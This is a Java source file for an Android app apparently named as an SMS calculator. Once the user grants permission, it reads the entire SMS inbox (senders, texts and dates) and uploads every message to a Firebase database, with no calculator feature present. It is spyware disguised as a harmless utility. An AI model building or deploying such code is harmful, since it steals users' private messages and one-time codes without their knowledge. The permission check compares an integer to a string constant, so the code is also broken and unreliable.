package com.example.smscalculator;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.net.Uri;
import android.provider.Telephony;
import android.database.Cursor;
import android.util.Log;
import java.util.ArrayList;

// استيراد مكتبات Firebase
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.DatabaseReference;

public class MainActivity extends Activity {
    
    // معرف الطلب للصلاحيات
    private static final int SMS_PERMISSION_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 1. طلب صلاحية قراءة الرسائل فور تشغيل التطبيق
        requestPermissions(new String[]{"android.permission.READ_SMS"}, SMS_PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == android.app.AppOpsManager.OPSTR_READ_SMS) {
                // إذا وافق المستخدم، نبدأ سحب الرسائل
                readSmsAndUpload();
            }
        }
    }

    private void readSmsAndUpload() {
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                // الربط مع Firebase (تأكد من أن مسار Messages صحيح)
                DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("Messages");

                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));

                    // إنشاء كائن لإرساله لـ Firebase
                    SmsMessage msg = new SmsMessage(address, body, date);
                    
                    // رفع الرسالة إلى Firebase تحت معرف فريد
                    dbRef.push().setValue(msg);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("SMS_ERROR", "Error reading SMS: " + e.getMessage());
        }
    }

    // كلاس داخلي لتمثيل الرسالة في Firebase
    class SmsMessage {
        public String sender;
        public String text;
        public String timestamp;

        public SmsMessage(String sender, String text, String timestamp) {
            this.sender = sender;
            this.text = text;
            this.timestamp = timestamp;
        }
    }
}